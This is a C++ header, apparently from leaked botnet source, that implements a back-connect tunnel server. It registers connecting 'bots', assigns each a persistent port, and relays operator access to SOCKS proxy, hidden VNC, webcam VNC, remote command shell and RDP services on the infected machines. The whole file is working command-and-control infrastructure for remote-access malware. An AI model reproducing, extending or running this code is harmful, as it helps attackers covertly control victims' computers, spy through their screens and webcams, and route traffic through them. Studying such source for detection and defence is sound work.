#pragma once

#include <random>

class CTunnelServer
{
private:
	typedef struct
	{
		SOCKET sock;
		CTunnelServer* instance;
	} TClientParam, *PClientParam;

	HANDLE m_hThread;
	SOCKET m_hListenSock;

	std::default_random_engine m_Rnd;

	TTunnel::TList m_Tunnels;
	CRITICAL_SECTION m_csTunnelsSync;
	backdb m_db;
	historydb m_history;
	acldb m_access;

	// выбор порта для нового туннеля
	static bool __stdcall InitializeClientPort(CTunnelServer* server, SOCKET& sock, unsigned int & port)
	{
		bool ok = false;

		// для "известных" ботов: пробуем начать слушать ранее выданный ему порт
		if (0 != port)
			ok = GetPort(sock, port);

		// если бот новый или произошла ошибка при прослушке "известным" ботом старого порта
		if (!ok)
		{
			// пробуем получить из базы незанятый "известными" ботами порт
			port = server->m_history.getfree();
			ok = GetPort(sock, port);
		}

		// если до сих пор не получилось - получаем свободный порт от системы (так быстрее, чем перебирать дальше)
		if (!ok)
			ok = GetPort(sock, port);

		return ok;
	}

	// инициализация туннеля с бэк-клиентом
	static DWORD __stdcall InitializeTunnelThreadProc(LPVOID param)
	{
		dbg("in");

		PClientParam pClientParam = (PClientParam)param;
		SOCKET hClientSock = pClientParam->sock;
		CTunnelServer* pServerInstance = pClientParam->instance;

		// TODO: Контроль за максимальным числом бэк-клиентов
		
		bool bResult = false;

		unsigned int size = 0;
		if (sizeof(size) == recv(hClientSock, (char*)&size, sizeof(size), MSG_PEEK))
		{
			CommonBackProto::PInitialRequest BuffRecv = (CommonBackProto::PInitialRequest)malloc(size);
			if (BuffRecv)
			{
				if (size == recv(hClientSock, (char*)BuffRecv, size, 0))
				{
					if ((CommonBackProto::BackHelloCmd == BuffRecv->cmd))
					{
						dbg("received hello");

						CommonBackProto::TInitialAnswer BuffSend = { 0, 0, 0, 0 };
						unsigned int maxusers = 0;

						// TODO: Добавить поддержку других типов сервиса
						switch (LOWORD(BuffRecv->type))
						{
							case CommonBackProto::backsocks:
								BuffSend.status = CommonBackProto::BackHelloOK;
								maxusers = 100;
								break;
							case CommonBackProto::backvnc:
							case CommonBackProto::backvnchidden:
							case CommonBackProto::backvncwebcam:
							case CommonBackProto::backport:
							case CommonBackProto::backcmd:
							case CommonBackProto::backrdp:
								BuffSend.status = CommonBackProto::BackHelloOK;
								maxusers = 1;
								break;
							default:
								BuffSend.status = CommonBackProto::BackHelloFail;
								break;
						}

						if (BuffSend.status == CommonBackProto::BackHelloOK)
						{
							EnterCriticalSection(&pServerInstance->m_csTunnelsSync);

							TTunnelId tid = { std::string((char*)&BuffRecv->id), BuffRecv->type };

							if (pServerInstance->m_Tunnels.end() == pServerInstance->m_Tunnels.find(tid))
							{
								dbg("new backclient");

								bool ok = false;
								TTunnel* newtunnel = new TTunnel();
								
								newtunnel->uport = pServerInstance->m_history.get(tid);
								if (0 == newtunnel->uport)
									pServerInstance->m_history.add(tid);
								newtunnel->bport = 0;

								if (InitializeClientPort(pServerInstance, newtunnel->user, newtunnel->uport) && GetPort(newtunnel->back, newtunnel->bport))
								{
									newtunnel->id = tid;

									newtunnel->control = hClientSock;
									newtunnel->unique = pServerInstance->m_Rnd();
									newtunnel->maxusers = maxusers;
									newtunnel->tunnels = &pServerInstance->m_Tunnels;
									newtunnel->sync = &pServerInstance->m_csTunnelsSync;
									newtunnel->db = &pServerInstance->m_db;
									newtunnel->access = &pServerInstance->m_access;

									HANDLE hThread = CreateThread(NULL, 0, TunnelHandlerThreadProc, (LPVOID)newtunnel, 0, NULL);
									ok = (NULL != hThread);
									CloseHandle(hThread);
								}

								if (ok)
								{
									dbg("new backclient %s ok, connection ports: user - %d, back - %d", &BuffRecv->id, newtunnel->uport, newtunnel->bport);

									sockaddr_in client;
									int len = sizeof(client);
									char* ip = NULL;
									if (SOCKET_ERROR != getpeername(hClientSock, (LPSOCKADDR)&client, &len))
										ip = inet_ntoa(client.sin_addr);
									if (!ip)
										ip = "unknown";

									pServerInstance->m_Tunnels[tid] = newtunnel;
									pServerInstance->m_db.add(tid, ip, newtunnel->uport);
									pServerInstance->m_history.update(tid, newtunnel->uport);

									BuffSend.status = CommonBackProto::BackHelloOK;
									BuffSend.unique = newtunnel->unique;
									BuffSend.userport = newtunnel->uport;
									BuffSend.backport = newtunnel->bport;

								}
								else
								{
									dbg("new backclient %s FAIL", &BuffRecv->id);

									BuffSend.status = CommonBackProto::BackHelloFail;
									Socket::Shutdown(newtunnel->user);
									Socket::Shutdown(newtunnel->back);
									delete newtunnel;
								}
							}
							else
							{
								dbg("known active backclient %s, need retry", &BuffRecv->id);
								BuffSend.status = CommonBackProto::BackHelloRetry;
							}

							LeaveCriticalSection(&pServerInstance->m_csTunnelsSync);
						}

						send(hClientSock, (char*)&BuffSend, sizeof(BuffSend), 0);
						bResult = (BuffSend.status == CommonBackProto::BackHelloOK);
					}
				}
				free(BuffRecv);
			}
		}
		
		if (!bResult)
		{
			dbg("init fail");
			Socket::Shutdown(hClientSock);
		}
		delete param;

		dbg("stop");
		return 0;
	}

	// установка соединений с бэк-клиентами
	static DWORD __stdcall ThreadProc(LPVOID param)
	{
		dbg("listening...");

		CTunnelServer* pInstance = (CTunnelServer*)param;
		SOCKET hListenSock = pInstance->m_hListenSock;

		while (true)  
		{
			SOCKET client = accept(hListenSock, NULL, NULL);
			if (INVALID_SOCKET == client)
			{
				dbg("stop listen");
				break;
			}

			dbg("new backclient");
			PClientParam clientparam = new TClientParam();
			clientparam->sock = client;
			clientparam->instance = pInstance;

			HANDLE hInitThread = CreateThread(NULL, 0, InitializeTunnelThreadProc, (LPVOID)clientparam, 0, NULL);
			if (hInitThread)
				CloseHandle(hInitThread);
			else
				dbg("thread FAIL");
		}	

		return 0;
	}

public:

	CTunnelServer()
	: m_hThread (NULL), m_hListenSock(INVALID_SOCKET), m_Rnd(GetTickCount())
	{
		InitializeCriticalSection(&m_csTunnelsSync);
	}

	virtual ~CTunnelServer()
	{
		Stop();
		DeleteCriticalSection(&m_csTunnelsSync);
	}
	
	bool Start(TServerSettings settings)
	{
		dbg("in");

		bool bResult = false;

		if (m_db.init() && m_history.init() && m_access.init())
		{
			m_hListenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
			if (SOCKET_ERROR != m_hListenSock)
			{
				sockaddr_in addr;
				ZeroMemory(&addr, sizeof(addr));
				addr.sin_family = AF_INET;
				addr.sin_port = htons(settings.Port);
				addr.sin_addr.s_addr = INADDR_ANY;

				if ((SOCKET_ERROR != bind(m_hListenSock, (LPSOCKADDR)&addr, sizeof(addr))) && (SOCKET_ERROR != listen(m_hListenSock, SOMAXCONN)))
				{
					dbg("thread");
					m_hThread = CreateThread(NULL, 0, ThreadProc, (LPVOID)this, 0, NULL);
					bResult = (NULL != m_hThread);
				}
			}
		}

		if (bResult)
			dbg("ok");

		if (!bResult)
			Stop();

		dbg("return");
		return bResult;
	}

	bool Stop()
	{
		dbg("in");

		closesocket(m_hListenSock);
		m_hListenSock = INVALID_SOCKET;

		WaitForSingleObject(m_hThread, 5000);
		CloseHandle(m_hThread);
		m_hThread = NULL;

		m_db.stop();
		m_history.stop();
		m_access.stop();
		dbg("ok");
		return true;
	}
};
